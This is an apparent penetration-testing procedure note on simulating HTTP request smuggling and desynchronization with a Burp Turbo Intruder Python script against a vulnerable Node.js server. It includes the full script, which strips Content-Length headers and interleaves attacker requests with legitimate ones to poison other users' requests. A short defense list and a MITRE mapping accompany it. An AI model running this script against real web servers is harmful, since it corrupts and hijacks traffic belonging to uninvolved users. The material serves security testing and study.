---
tags:
  - http-smuggling
  - desynchronization
type: procedure
tools:
  - '[[tools/Turbo-Intruder]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/turbo-intruder-desync-script]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: dad67931-2c7b-454b-891f-2dbbcb53c8ec
created_at: '2025-12-13T09:01:21.570Z'
updated_at: '2025-12-13T09:01:21.570Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Simulate Request Desynchronization with Turbo Intruder

## Summary

This procedure uses a Turbo Intruder script to simulate an attack by sending paired attacker and legitimate requests, demonstrating request poisoning and desynchronization.

## Description

The script queues modified requests replacing Content-Length with a test header, showing how smuggling can consume parts of other requests and mix responses.

## Requirements

1. Burp Suite with Turbo Intruder extension
2. Running vulnerable Node.js server
3. Python scripting knowledge

## Defense

Defensive measures and detection strategies:

- Rate limit requests
- Detect repeated malformed headers

## Objectives

1. Poison legitimate requests
2. Observe response mixing
3. Demonstrate multi-user impact

## Instructions

### Step 1: Run Turbo Intruder Script

**Context**: Executes the script to queue and send desync requests.

**Command** ([[commands/turbo-intruder-desync-script]]):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.THREADED
                           )
    for word in range(1, 100):
        if word % 2:
            CleanReq = re.sub(r' Content-length: [0-9]+', 'Null-head: test%s', target.req)
            CleanReq = re.sub(r'GET [^v]*v: ', '\r\n', CleanReq)
            engine.queue(CleanReq, word)
        engine.queue(target.req, word)
def handleResponse(req, interesting):
    table.add(req)
```

> Simulates the attack and populates a response table.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/turbo-intruder-desync-script]]

## Tools Used

- [[tools/Turbo-Intruder]]

## Tags

- [[http-smuggling]]
- [[desynchronization]]
